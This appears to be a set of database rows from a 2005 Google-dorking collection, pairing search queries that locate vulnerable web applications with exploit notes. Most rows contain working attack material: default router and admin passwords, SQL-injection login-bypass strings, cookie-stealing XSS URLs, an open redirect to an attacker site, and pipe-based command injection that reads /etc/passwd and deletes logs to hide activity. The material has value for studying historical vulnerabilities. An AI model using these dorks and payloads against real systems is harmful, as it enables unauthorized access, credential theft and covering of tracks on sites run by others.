(1049, 'intitle:"V1" "welcome to phone settings" password', 'http://www.google.com/search?q=intitle:%22V1%22+%22welcome+to+phone+settings%22+password&num=100&hl=en&lr=&c2coff=1&safe=off&filter=0', 1720, '2005-08-07', 'This is a small search for the Italk BB899 Phone Adaptor login page. iTalkBB is a local and long distance calling service provided by iTalk Broadband Corporation. It combines voice and internet networks to provide inbound and outbound long distance and local calling solutions.Depending on the version of firmware preinstalled on your IP Box, the password to get into the setting pages may be either 12345678 or 87654321.', '2005-08-07', NULL, NULL),
(1053, 'PHPFreeNews inurl:Admin.php', 'http://www.google.com/search?q=PHPFreeNews+inurl:Admin.php&hl=it&lr=&filter=0', 4778, '2005-08-07', '29/07/2005 8.36.03PHPFreeNews Version 1.32 (&amp; previous) sql injection/login bypass, cross site scripting, path disclosure, information disclosure  author site: http://www.phpfreenews.co.uk/Main_Intro.phpxss poc:http://[target]/[path]/inc/Footer.php?ScriptVersion=alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&amp;NewsDir=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableRatings=1&amp;NewsDir=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&amp;NewsDir=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&amp;PopupWidth=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?FullNewsDisplayMode=3&amp;PopupHeight=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&amp;PopupWidth=")}//--&gt;alert(document.cookie)http://[target]/[path]/inc/ScriptFunctions.php?EnableComments=1&amp;PopupHeight=")}//--&gt;alert(document.cookie)also a user can craft a url to redirect a victim to an evil site:http://[target]/[path]/inc/Logout.php?AdminScript=http://[evil_site]/[evil_script]path disclosure:http://[target]/[path]/inc/ArchiveOldNews.phphttp://[target]/[path]/inc/Categories.phphttp://[target]/[path]/inc/CheckLogout.phphttp://[target]/[path]/inc/CommentsApproval.phphttp://[target]/[path]/inc/Images.phphttp://[target]/[path]/inc/NewsList.phphttp://[target]/[path]/inc/Password.phphttp://[target]/[path]/inc/Post.phphttp://[target]/[path]/inc/PostsApproval.phphttp://[target]/[path]/inc/PurgeOldNews.phphttp://[target]/[path]/inc/SetSticky.phphttp://[target]/[path]/inc/SetVisible.phphttp://[target]/[path]/inc/Statistics.phphttp://[target]/[path]/inc/Template.phphttp://[target]/[path]/inc/UserDefinedCodes.phphttp://[target]/[path]/inc/Users.phpinformation disclosure:googledork:PHPFreeNews inurl:Admin.php(with this, you can passively fingerprint the server, PHP &amp; MySQL version are in Google description...because this info are shownwed with non-chalance in admin.php page ;) )default password:login: Adminpass: AdminMySQL Injection / Login Bypass in previous versions:login: Adminpassword: '') or isnull(1/0) or (''a''=''anote: all string, not consider ''or''in 1.32 version LoginUsername and LoginPassword vars are addslashed... but, try this: login: whateverpass: //'') or isnull(1/0) /* this is definetely patched in 1.40 version', '2005-08-07', NULL, NULL),
(1054, 'inurl:nquser.php filetype:php', 'http://www.google.com/search?hl=it&q=inurl%3Anquser.php+filetype%3Aphp&btnG=Cerca+con+Google&meta=', 16435, '2005-08-07', 'Netquery 3.1 remote commands execution, cross site scripting, information disclosure poc exploit software: author site: http://www.virtech.org/tools/ a user can execute command on target system by PING panel, if enabled like often happens, using pipe char on input text "Ping IP Address or Host Name", example: | cat /etc/passwd then you will see plain text password file | pwd to see current path | rm [pwd_output]/logs/nq_log.txt to delete log file... disclosure of user activity: if enabled, a user can view clear text log file through url: http://[target]/[path]/logs/nq_log.txt xss: http://[target]/[path]/submit.php?portnum="/&gt;alert(document.cookie) http://[target]/[path]/nqgeoip2.php?step=alert(document.cookie) http://[target]/[path]/nqgeoip2.php?body=alert(document.cookie) http://[target]/[path]/nqgeoip.php?step=alert(document.cookie) http://[target]/[path]/nqports.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?step=alert(document.cookie) http://[target]/[path]/nqports2.php?body=alert(document.cookie) http://[target]/[path]/portlist.php?portnum=alert(document.cookie) a user can use on-line Netquery installations like proxy servers to launch exploit from HTTP GET request panel, example: exploiting Phpbb 2.0.15: make a get request of http://[vulnerable_server]/[path]/viewtopic.php?t=[existing_topic]&amp;highlight=''.system($HTTP_GET_VARS[command].''&amp;command=cat%20/etc/passwd', '2005-08-07', NULL, NULL),
(1056, '"Powered by FlexPHPNews" inurl:news | inurl:press', 'http://www.google.com/search?hl=it&q=%22Powered+by+FlexPHPNews%22+inurl%3Anews+%7C+inurl%3Apress&meta=', 3037, '2005-08-07', '24/07/2005 2.38.13Flex PHPNews 0.0.4 login bypass/ sql injection, cross site scripting &amp; resource consumption poc exploitsoftware:author site:http://www.china-on-site.com/flexphpnews/downloads.phpxss / cookie disclosure:http://[target]/[path]/index.php?front_indextitle=alert(document.cookie)http://[target]/[path]/index.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/index.php?front_latestnews="&gt;alert(document.cookie)http://[target]/[path]/news.php?newsid="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_rating="&gt;alert(document.cookie)http://[target]/[path]/news.php?salt="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_letmerateit="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_ratebest="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_ratesubmit="&gt;alert(document.cookie)http://[target]/[path]/news.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/search.php?front_searchresult=alert(document.cookie)http://[target]/[path]/search.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?front_searchsubmit="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?front_latestnews="&gt;alert(document.cookie)http://[target]/[path]/catalog.php?catalogid="&gt;alert(document.cookie)path disclosure:http://[target]/[path]/admin/usercheck.php?logincheck=%00denial of service / resources consumption:http://[target]/[path]/news.php?prenumber=99999999999999999999999999999999http://[target]/[path]/news.php?nextnumber=99999999999999999999999999999999($prenumber and $nextnumber are uninitialized final values of a loop...) sql injection / bypass authentication:go to login page:http://[target]/[path]/admin/(usually admin if not changed)login as user:   '' OR ''a''=''aand pass     :   '' OR ''a''=''a           boom! you''re admin ...the problem is in usercheck.php at line 5:$sql = "select username from newsadmin where username=''$checkuser'' and password=''$checkpass''";you can post always true statements, like ''a''=''a''solution: replace $checkuser and $checkpass vars with your username and pass, by the moment', '2005-08-07', NULL, NULL),
(1099, '"Mail-it Now!" intitle:"Contact form" | inurl:contact.php', 'http://www.google.com/search?hl=en&q=%22Mail-it+Now%21%22+intitle%3A%22Contact+form%22+%7C+inurl%3Acontact.php', 3159, '2005-09-11', 'Mail-it Now! 1.5 (possibly prior versions) contact.php remote code executionsite: http://www.skyminds.net/source/description: a mail form scriptvulnerability: unsecure file creation -&gt; remote code executionwhen you post an attachment and upload it to the server (usually to "./upload/" dir )the script rename the file in this way:[time() function result] + [-] + [filename that user choose]spaces are simply replaced with "_" chars.So a user can post an executable attachment, calculate the time() result locallythen, if attachment is a file like this:can launch commands on target system, example:http://[target]/[path]/[time() result]-[filename.php]?command=cat%20/etc/passwdu can find my poc code at this url: http://rgod.altervista.org/mailitnow.html', '2005-09-11', NULL, NULL),
